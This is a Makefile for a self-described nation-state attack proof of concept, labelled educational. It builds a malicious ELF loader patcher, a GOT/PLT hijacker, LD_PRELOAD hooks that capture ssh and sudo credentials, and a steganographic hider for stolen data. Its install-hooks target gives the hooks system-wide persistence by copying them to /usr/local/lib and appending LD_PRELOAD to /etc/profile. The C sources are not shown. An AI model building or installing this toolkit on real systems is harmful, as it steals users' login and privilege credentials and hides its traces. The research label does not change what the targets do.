# Makefile for Nation State Attack POC Components
# Educational/Research purposes only

CC = gcc
CFLAGS = -Wall -Wextra -fPIC -shared -ldl -g
STATIC_FLAGS = -Wall -Wextra -g
PYTHON = python3

# Directories
LOADER_DIR = loader-patch
GOT_DIR = got-hijacking  
HOOK_DIR = credential-hooks
UTILS_DIR = utils

# Targets
LOADER_BIN = $(LOADER_DIR)/malicious_loader
GOT_LIB = $(GOT_DIR)/got_hijacker.so
PLT_BIN = $(GOT_DIR)/plt_analyzer
SSH_LIB = $(HOOK_DIR)/ssh_hook.so
SUDO_LIB = $(HOOK_DIR)/sudo_hook.so
STEGO_BIN = $(UTILS_DIR)/steganographer

.PHONY: all clean test demo install-hooks remove-hooks

all: $(LOADER_BIN) $(GOT_LIB) $(PLT_BIN) $(SSH_LIB) $(SUDO_LIB) $(STEGO_BIN)

# Loader patching components
$(LOADER_BIN): $(LOADER_DIR)/malicious_loader.c
	$(CC) $(STATIC_FLAGS) -o $@ $<

# GOT/PLT hijacking components  
$(GOT_LIB): $(GOT_DIR)/got_hijacker.c
	$(CC) $(CFLAGS) -o $@ $<

$(PLT_BIN): $(GOT_DIR)/plt_analyzer.c
	$(CC) $(STATIC_FLAGS) -ldl -o $@ $<

# Credential hooks
$(SSH_LIB): $(HOOK_DIR)/ssh_hook.c
	$(CC) $(CFLAGS) -o $@ $<

$(SUDO_LIB): $(HOOK_DIR)/sudo_hook.c
	$(CC) $(CFLAGS) -o $@ $<

# Utilities
$(STEGO_BIN): $(UTILS_DIR)/steganographer.c
	$(CC) $(STATIC_FLAGS) -o $@ $<

# Test individual components
test-loader: $(LOADER_BIN)
	@echo "=== Testing Loader Patcher ==="
	@echo "Creating test binary..."
	@cp /bin/echo ./test_echo
	@$(PYTHON) $(LOADER_DIR)/patch_interp.py ./test_echo ./patched_echo $(realpath $(LOADER_BIN))
	@echo "Testing patched binary:"
	@./patched_echo "Loader test completed"
	@rm -f ./test_echo ./patched_echo

test-plt: $(PLT_BIN)
	@echo "=== Testing PLT Analyzer ==="
	@$(PLT_BIN)

test-got: $(GOT_LIB)
	@echo "=== Testing GOT Hijacker ==="
	@echo "Compiling test program..."
	@echo 'int main() { printf("Hello\\n"); return 0; }' > test_got.c
	@$(CC) -o test_got test_got.c
	@echo "Running with GOT hijacking:"
	@LD_PRELOAD=./$(GOT_LIB) ./test_got
	@rm -f test_got test_got.c

test-hooks: $(SSH_LIB) $(SUDO_LIB)
	@echo "=== Testing Credential Hooks ==="
	@echo "SSH hook test:"
	@LD_PRELOAD=./$(SSH_LIB) echo "SSH test"
	@echo "SUDO hook test:" 
	@LD_PRELOAD=./$(SUDO_LIB) echo "SUDO test"

test-stego: $(STEGO_BIN)
	@echo "=== Testing Steganographer ==="
	@$(STEGO_BIN) sysinfo
	@$(STEGO_BIN) cred testuser testpass testhost
	@echo "Hidden files:"
	@$(STEGO_BIN) list

# Demonstration scenario
demo: all
	@echo "========================================"
	@echo "  NATION STATE ATTACK POC DEMO"
	@echo "========================================"
	@echo ""
	@$(MAKE) test-plt
	@echo ""
	@$(MAKE) test-got
	@echo ""
	@$(MAKE) test-hooks
	@echo ""
	@$(MAKE) test-stego
	@echo ""
	@echo "=== Processing captured logs ==="
	@$(PYTHON) $(UTILS_DIR)/credential_logger.py collect
	@$(PYTHON) $(UTILS_DIR)/credential_logger.py report
	@echo ""
	@echo "Demo completed. Check /tmp/ for log files."

# Install hooks system-wide (requires root)
install-hooks: $(SSH_LIB) $(SUDO_LIB)
	@echo "WARNING: This will install credential hooks system-wide"
	@echo "Only proceed in controlled test environment!"
	@read -p "Continue? (y/N): " confirm && [ "$$confirm" = "y" ]
	sudo cp $(SSH_LIB) /usr/local/lib/
	sudo cp $(SUDO_LIB) /usr/local/lib/
	@echo "export LD_PRELOAD=/usr/local/lib/ssh_hook.so:/usr/local/lib/sudo_hook.so" | sudo tee -a /etc/profile
	@echo "Hooks installed. Logout/login to activate."

remove-hooks:
	sudo rm -f /usr/local/lib/ssh_hook.so /usr/local/lib/sudo_hook.so
	sudo sed -i '/LD_PRELOAD.*hook\.so/d' /etc/profile
	@echo "Hooks removed."

# Analysis tools
analyze: all
	@echo "=== System Analysis ==="
	@echo "Current processes with LD_PRELOAD:"
	@ps aux | grep -i preload || echo "None found"
	@echo ""
	@echo "Checking for hook libraries:"
	@lsof | grep -E "(ssh_hook|sudo_hook|got_hijacker)" || echo "None loaded"
	@echo ""
	@echo "Credential logs:"
	@ls -la /tmp/.*.log 2>/dev/null || echo "No logs found"

# Cleanup
clean:
	rm -f $(LOADER_BIN) $(GOT_LIB) $(PLT_BIN) $(SSH_LIB) $(SUDO_LIB) $(STEGO_BIN)
	rm -f test_* patched_*
	rm -rf /tmp/.system_data
	rm -f /tmp/.*.log /tmp/.creds.db
	@echo "Cleanup completed."

# Help
help:
	@echo "Available targets:"
	@echo "  all          - Build all components"
	@echo "  demo         - Run complete demonstration"
	@echo "  test-*       - Test individual components"
	@echo "  install-hooks - Install hooks system-wide (DANGEROUS)"
	@echo "  remove-hooks  - Remove installed hooks"
	@echo "  analyze      - Analyze current system state"
	@echo "  clean        - Remove all built files and logs"